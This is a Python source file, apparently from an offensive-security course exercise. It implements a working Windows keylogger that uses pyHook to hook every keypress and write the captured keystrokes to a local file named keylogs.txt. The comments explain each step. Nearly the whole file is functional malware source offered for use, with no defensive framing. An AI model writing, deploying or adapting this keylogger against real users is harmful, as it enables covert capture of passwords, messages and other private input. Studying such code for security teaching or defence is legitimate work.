# reference: https://www.udemy.com/python-for-offensive-security-practical-course/

import pythoncom, pyHook

# when the user hit any keyboard button, keypressed function will be executed,
# and such action will be store in event

def keypressed(event):
    global store

# since 'enter' and 'backspace' are not handled properly, we can hardcode it using their ASCII values
    if event.Ascii == 13:
        keys = ' < Enter > '
    elif event.Ascii == 8:
        keys = ' <BACK SPACE> '
    else:
        keys = chr(event.Ascii)

    # we store the ascii keys into 'store' variables and write it to a text file
    store = store + keys
    fp = open("keylogs.txt","w")
    fp.write(store)
    fp.close()

    # return True to allow the function from running continuously
    return True

# initialize 'store' to store all the pressed key events
store = ''

# create and register a hook manager
obj = pyHook.HookManager()
# once the user hit any keyboard button, execute keypressed function
obj.KeyDown = keypressed

# initialize the hooking loop and pump out the messages
obj.HookKeyboard()
pythoncom.PumpMessages()
